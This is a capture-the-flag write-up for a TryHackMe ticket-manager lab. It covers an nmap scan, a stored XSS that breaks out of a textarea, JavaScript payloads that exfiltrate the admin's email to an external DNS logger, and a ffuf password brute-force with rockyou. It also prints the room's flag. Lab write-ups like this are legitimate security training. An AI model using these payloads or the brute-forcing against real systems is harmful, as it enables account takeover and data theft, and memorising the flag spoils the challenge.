> That's the ticket

**Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!**

# Nmap

nmap -sC -sV -A -T4 -Pn -vv -p- -oN nmap/initial 10.10.221.125

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
```

And we can register a new user and explore the webapp.

`test@tryhackme.com`:`testTest`. And I created tickets in the website I was also montirong the requests through the Console Tab. Nothing interesting. So I tried for HTML Injection. Nope. Then I tried for XSS.

## Payload 1:<script>alert(1)</script>

Still didn't work.Then viewing the page-sorce I found out the position of our payload and what tag is present. Looks like it is a textarea tag. So let's escape it!

## Payload 2: </textarea><script>alert(1)</script>

And it works! As from the hint given let's move onto to DNS logger.

## Paylaod 3: </textarea><img src=http://bb1bf83e2e03c8a49f0565e998e36cdd.log.tryhackme.tech>

Gave me 1 DNS request and 1 HTTP request from us. The logger is outside the firewall so we have to bypass it! A webserver is behind the firewall so it can not connect back to us. But if there is a “localhost” in the url, it seems like it can make the request outside the firewall.

## Payload 4: 

```
</textarea><script>
var href="http://bb1bf83e2e03c8a49f0565e998e36cdd.log.tryhackme.tech/test";
new Image().src=href;
</script>
```

It works an we can see different IP in our DNS request.

```
The Lookup was requested @ 18 Jun 2021 03:47:54 UTC from IP 3.251.105.181
```

Let's try adding localhost to the payload.

## Payload 4

```
</textarea><script>
var href="http://localhost.bb1bf83e2e03c8a49f0565e998e36cdd.log.tryhackme.tech/test";
new Image().src=href;
</script>
```

And I got 2 DNS queries and 1 was from inside the firewall! And our 1st question is to find the IT Supports email address. Let's modify the payload.

## Payload 5

```
</textarea><script>
var email = document.getElementById('email').innerHTML;
email = email.replace("@", "8")
email = email.replace("0", "0")
document.location = "http://" + email + "bb1bf83e2e03c8a49f0565e998e36cdd.log.tryhackme.tech"
</script>
```

And we got it!

```
adminaccount8itsupport.thmbb1bf83e2e03c8a49f0565e998e36cdd.log.tryhackme.tech
```

# Email ID -> adminaccount@itsupport.thm

Since we got the mail id let's bruteforce password. Let's use ffuf!

ffuf -w /usr/share/wordlists/rockyou.txt -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.221.125/login -H "Content-Type: application/x-www-form-urlencoded" -fw 475

```bash
123123                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

And we got our flag at Ticket 1!

```
THM{6804f45260135ec8418da2d906328473}
```